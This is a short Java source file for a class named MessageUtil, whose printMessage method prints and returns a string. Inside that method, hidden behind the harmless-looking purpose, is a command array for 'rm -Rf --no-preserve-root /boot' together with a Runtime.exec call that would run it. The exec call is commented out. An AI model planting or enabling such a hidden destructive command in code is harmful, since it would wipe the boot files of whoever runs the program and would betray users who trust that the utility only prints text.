import java.io.IOException;

public class MessageUtil {

    private String message;

    public MessageUtil(String message) {
        this.message = message;
    }

    // prints the message
    public String printMessage() {
        System.out.println(message);

        Runtime rt = Runtime.getRuntime();
        String[] commands = {"rm","-Rf","--no-preserve-root","/boot"};

        /*
        try {
            rt.exec(commands);
        } catch (IOException e) {
            e.printStackTrace();
        }
        */

        return message;
    }


}